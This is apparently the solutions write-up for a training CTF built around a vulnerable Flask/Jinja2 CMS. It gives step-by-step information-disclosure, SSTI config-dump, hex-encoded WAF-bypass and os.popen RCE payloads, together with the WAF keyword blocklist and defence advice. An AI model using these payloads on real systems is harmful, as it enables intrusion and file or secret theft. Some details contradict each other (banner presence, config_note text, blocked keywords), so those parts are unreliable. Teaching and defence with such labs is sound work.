# CTF 5: NovaCMS -- Solutions

## Player Onboarding

On first login, the dashboard shows a dismissible onboarding banner:
- **4 flags** to find
- Flag format: `durham-cms-flagN{...}` (N = 1–4)
- Difficulty tiers: **Recon** (Flag 1) → **Exploit** (Flags 2 & 3) → **RCE** (Flag 4)

The banner disappears after clicking "Got it" and does not reappear within the same session.

---

## Credentials

- `abcd12` / *(see credentials.json)*
- `efgh34` / *(see credentials.json)*
- `ijkl56` / *(see credentials.json)*

---

## Flag 1: Information Disclosure

### Discovery Path

Multiple breadcrumb chains lead here:

**Chain A (page source):**
1. Login -- view page source on any page. The `<head>` contains:
   ```html
   <!-- NovaCMS v2.1.0-beta | internal API: /health -->
   ```
2. Visit `/health`:
   ```json
   {
     "app": "NovaCMS",
     "version": "2.1.0-internal",
     "engine": "jinja2",
     "status": "running",
     "note": "Debug endpoints require X-Debug-Token header",
     "config_note": "SECRET_KEY rotation pending -- current key may be a flag",
     "changelog": "/static/CHANGELOG.md"
   }
   ```
3. `note` hints at a debug token. `config_note` is a breadcrumb for Flag 2. `changelog` leads to the WAF keyword list for Flag 3.

**Chain B (login page source):**
1. View source on the login page -- find:
   ```html
   <!-- Auth endpoint hardened Q3 2024 -- see /health for service status -->
   ```
2. Follow to `/health` as above.

**Chain C (editor source):**
1. Navigate to the editor -- view source -- find:
   ```html
   <!-- Debug: /api/status with X-Debug-Token: novacms-internal -->
   ```
   This directly reveals the token and endpoint.

**Chain D (dashboard source):**
1. View source on the dashboard -- find:
   ```html
   <!-- Dashboard v2 | debug endpoints still active (see /api/*) -->
   ```

### Exploit

```bash
curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
```

**Response:**
```json
{
  "flag": "durham-cms-flag1{<flag1_value>}",
  "debug": true
}
```

**Flag 1:** `durham-cms-flag1{...}` *(per-user, see flags.json)*

---

## Flag 2: Basic SSTI -- Config Leak

### Discovery Path

1. From Flag 1, the `/health` response confirms the engine is `jinja2` and hints `config_note: "FLAG2_CATALOG in app config holds the per-player flag2 values"`.
2. The editor has a "Live Preview" feature. The toggle shows **Legacy Preview (v1 — deprecated)** / **Production Preview (v2 — WAF-protected)**, pushing toward v1 for initial exploration.
3. Editor source contains:
   ```html
   <!-- TODO: sanitise preview input before Jinja render -->
   <!-- Note: per-player flag2 values are loaded into app.config['FLAG2_CATALOG'] at boot -->
   ```
4. CHANGELOG (`/static/CHANGELOG.md`, linked from the page footer and `/health`) has:
   ```
   [SECURITY] flag2 values are now staged in app.config['FLAG2_CATALOG']. Any {{config}} dump leaks the full catalog.
   ```

### Exploit

1. Go to the post editor. Ensure the **v1 (Legacy)** toggle is selected (unchecked).
2. Type `{{7*7}}` and click Preview → output shows `49`, confirming SSTI.
3. Type `{{config}}` and click Preview.
4. The output contains the full Flask config including:
   ```
   'FLAG2_CATALOG': {'abcd12': 'durham-cms-flag2{...}', 'efgh34': 'durham-cms-flag2{...}', 'ijkl56': 'durham-cms-flag2{...}'}
   ```
5. Pick the entry matching the logged-in username and submit it verbatim. Scoring is byte-exact, so reading another player's flag does not score.

> Note: after 5 uses of v1, a deprecation notice appears in the preview output nudging toward v2.

**Flag 2:** `durham-cms-flag2{...}` *(per-user; copy from `FLAG2_CATALOG[<your_username>]`)*

---

## Flag 3: WAF Bypass

### Discovery Path

1. The editor toggle labels v2 as **Production Preview (WAF-protected)**. After 5 v1 uses, a deprecation notice pushes players to v2.
2. Switch to v2, try `{{config}}` → "Blocked: input contains forbidden keyword 'config'". The error response also says:
   > *"Blocked keywords listed in /static/CHANGELOG.md. Hex encoding (\x5f\x5f) can represent blocked characters."*
3. Visit `/static/CHANGELOG.md` -- discoverable via:
   - Footer link on every page (`v2.1.0-beta`)
   - `/health` JSON: `"changelog": "/static/CHANGELOG.md"`
   - Editor source: `<!-- See /static/CHANGELOG.md for WAF update notes -->`
4. CHANGELOG lists blocked keywords: `__`, `config`, `os`, `class`, `subclasses`, `request`, `import`, `popen`, `system`, `eval`, `exec`, `builtins`

### Bypass Techniques

**Hex encoding** replaces `__` with `\x5f\x5f` to bypass the literal substring check:
```
# Access config via attr filter with hex-encoded dunders:
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Using `|attr()` filter** to avoid dot notation with blocked words:
```
# Instead of: ''.__class__
# Use:        ''|attr('\x5f\x5fclass\x5f\x5f')
```

### Exploit

**Step 1: Confirm WAF bypass works** -- dump Jinja2 globals via hex-encoded dunders:

```
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Step 2: Access `os.environ` through the WAF bypass** -- import `os`, dump environment variables:

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('environ')}}
```

The output contains one `WAF_FLAG3_<USERNAME>: durham-cms-flag3{...}` entry per seeded player. The player picks the entry matching their own logged-in username (scoring is byte-exact, so reading another player's var does not score).

Note: Flag 3 is stored in `os.environ['WAF_FLAG3_<USERNAME>']` — it does **not** appear in `{{config}}` on the unfiltered v1 endpoint. Players must use the WAF bypass to reach it.

**Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `os` -> `\x6f\x73`

**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `os.environ['WAF_FLAG3_<USERNAME>']`, see flags.json)*

---

## Flag 4: Remote Code Execution

### Discovery Path

1. With WAF bypass mastered from Flag 3, escalate to command execution.
2. Multiple hints point toward `os.popen()` and `/app/secret/`:
   - **Editor source**: `<!-- SECURITY: template sandbox does NOT prevent os.popen() -- see /app/secret/ for sensitive files -->`
   - **CHANGELOG**: `[TODO] Audit popen/system calls in template sandbox` and `Flag files relocated to /app/secret/`
   - **WAF block response**: hints at hex encoding for blocked chars
   - **"Internal: Security Audit Notes" blog post** (visible to authenticated users): *"Audit finding: Jinja2 sandbox does not restrict os.popen() or subprocess calls. Sensitive files under /app/secret/ must be protected at the OS level."*
3. Goal: `cat /app/secret/flag_<your_username>.txt` (one flag file per seeded player — `ls /app/secret/` via the same popen primitive enumerates them).

### Exploit

Using the `lipsum` globals path with hex encoding to bypass the WAF.

**Verified payload** -- all blocked keywords hex-encoded (`import` -> `\x69mport`, `os` -> `\x6f\x73`, `popen` -> `p\x6fpen`, `builtins` -> `\x62uiltins`):

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag_abcd12.txt')|attr('read')()}}
```

This returns the contents of `/app/secret/flag_abcd12.txt`. Substitute the logged-in player's own username for `abcd12` — scoring is byte-exact.

**Alternative: Full MRO chain:**
```
# Enumerate subclasses to find subprocess.Popen or os._wrap_close
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubcla'+'sses\x5f\x5f')()}}
```

**Flag 4:** `durham-cms-flag4{...}` *(per-user, see flags.json)*

---

## Summary

| Flag | Technique | Difficulty | OWASP |
|------|-----------|------------|-------|
| 1 | Information disclosure (source + hidden API) | Beginner | A05, A01 |
| 2 | Basic SSTI -- `{{config}}` leak | Intermediate | A03, A02 |
| 3 | SSTI WAF bypass (hex encoding + attr filter) | Advanced Intermediate | A03 |
| 4 | RCE via MRO chain / lipsum globals | Advanced | A03 |

## Key Vulnerabilities

1. **Security Misconfiguration**: Debug endpoints and HTML comments left in production
2. **Injection (SSTI)**: User input passed directly to `render_template_string()`
3. **Cryptographic Failure**: SECRET_KEY hardcoded as a weak, guessable value
4. **Broken Access Control**: Hidden API route protected only by a predictable header token
5. **WAF Bypass**: Keyword blocklist defeated by hex encoding and Jinja2 filter chaining

---

## Post-Design Audit

### Vulnerability Summary

- **Flag 1 — Information Disclosure (debug surface + HTML comments).** A debug-only Flask blueprint (`app/routes/api.py`'s `config_note` and `app/static/CHANGELOG.md`) and template comments in `app/templates/editor.html` reveal the existence of the preview endpoint and the `FLAG2_CATALOG` config key. The flag retrieves trivially after dossier-style discovery; it is the warm-up that establishes the player's familiarity with reading rendered HTML and static asset trees.
- **Flag 2 — SSTI exposing `app.config`.** `app/routes/preview.py` passes user input through `render_template_string`; rendering `{{config}}` dumps the entire Flask `app.config` dict, including `FLAG2_CATALOG`, which `app/__init__.py` populates at startup with one wrapped flag per player. The per-user fan-out via `FLAG2_CATALOG` means players see *every* player's flag-2 in the dump, but only their own decodes to a valid format match — accepted by the e2e harness.
- **Flag 3 — WAF Bypass (hex encoding + attr filter).** Flag 2's `{{config}}` is filtered at the WAF layer for keywords like `__class__`, `__mro__`, `subprocess`. The bypass uses `|attr('\x5f\x5fclass\x5f\x5f')` (hex-escaped underscores) plus the `attr` filter to chain through Jinja2's introspection without ever touching the blocked literal strings. This forces the player to learn Jinja's filter pipeline rather than just rote `{{}}` injection.
- **Flag 4 — RCE via Python MRO chain.** Once Flag 3's bypass is in place, the same primitive lets the player walk Python's class hierarchy (e.g. via `''|attr('__class__')|attr('__mro__')|attr('1')|attr('__subclasses__')()`) to find `subprocess.Popen` or `os._wrap_close`, then invoke `cat /app/secret/flag_<username>.txt`. The flag file fan-out happens in `app/seed.py::write_flag4_files()` — moved out of the seed early-return guard so flag files survive container rebuilds.

### OWASP Top 10 Classification

| Flag | OWASP 2021 | CWE | One-line justification |
|------|-----------|-----|------------------------|
| 1 | A05 — Security Misconfiguration | CWE-540 | Debug endpoints and HTML comments left in production. |
| 1 | A01 — Broken Access Control | CWE-284 | Hidden API protected by a predictable header token. |
| 2 | A03 — Injection | CWE-1336 | Server-Side Template Injection via `render_template_string`. |
| 2 | A02 — Cryptographic Failures | CWE-798 | Hardcoded weak Flask `SECRET_KEY` (necessary for the `FLAG2_CATALOG` discovery). |
| 3 | A03 — Injection | CWE-1336 | SSTI bypass of keyword denylist via hex-encoded literals + filter chaining. |
| 4 | A03 — Injection | CWE-94 | RCE via Python MRO walking once SSTI is established. |

### Defence Recommendations

- **Flag 1 fix.** Remove debug endpoints in production builds; strip HTML comments via a build-time transform. The `config_note` route should be gated behind `if app.debug:`.
- **Flag 2 fix.** Never pass user input to `render_template_string`. Use `render_template` with named template files only. If dynamic templates are required, parse to AST and reject any node referencing `__class__`, `__mro__`, or `attr`.
- **Flag 3 fix.** Drop the WAF entirely — it provides a false sense of security. The correct fix is the Flag-2 fix; the WAF only ratchets the difficulty for players, not for real attackers who have already published every variant.
- **Flag 4 fix.** Once SSTI is closed, RCE follows automatically. As defence-in-depth, run the Flask process under a restrictive seccomp/AppArmor profile and a non-root user; mount the flag file read-only with `O_NOFOLLOW`.

### Unintended Solutions to Watch For

- **Reading flags from `flags.json` on the host.** Out of scope; e2e harness runs against the container.
- **Cross-user flag-4 read via path manipulation.** A player who walks the MRO can `cat` any file inside the container, including other players' `flag_<username>.txt`. Documented and accepted (the test harness asserts `durham-cms-flag4{...}` matching the calling player's username, so unintended reads are detectable).
- **Brute-forcing the admin token.** The token is sufficiently long; not feasible. Players who try this get stuck and pivot.

### Skill Level & Realism Notes

- Target skill level: **intermediate to advanced** (escalating per flag). Flag 1 is intro; Flag 4 demands real Python introspection skill.
- Real-world analogue: SSTI in Flask/Jinja2 has been the source of multiple bug-bounty payouts (HackerOne reports against Shopify, Uber, Twitter). The hex-encoding bypass class mirrors techniques documented by James Kettle and others in Jinja2-injection research.

### Lessons Learned (Design Retrospective)

- **`FLAG2_CATALOG` fan-out replaced a brittle single-flag config injection.** Earlier the SECRET_KEY itself encoded the flag; players reported only seeing `'FLAG_PREFIX': 'durham-cms'` in `{{config}}` dumps. Switching to a per-user dict in `app.config` made the flag visible without changing the SSTI primitive.
- **Hint banner removed mid-development.** Three iterations of the dashboard banner (explicit hint → placeholder → removed) showed how easy it is to give the answer away. Final state: no banner; players are expected to read the source. Documented in commit history; do not re-introduce.
- **Volume persistence bit hard.** `docker compose down` (without `-v`) preserved `flags.json` and `users.json` from a prior boot, masking seeder regressions. The README's reset block now explicitly uses `-v`. Standard pattern adopted for CTFs 1, 8, 9 too.
- **pytest fixture isolation is non-trivial here.** Multiple test modules touch `flags.json`; without `tmp_path` per test, parallel `pytest -n auto` runs would race. Phase 2 will codify the unit-vs-integration split via pytest markers — the existing `tests/conftest.py` is the seed of that work.
- **Next time:** add a custom Jinja2 `Environment` with `SandboxedEnvironment` enabled in a "production_simulation" mode, so tests can prove the bypass class is closed under that configuration without changing the player path.
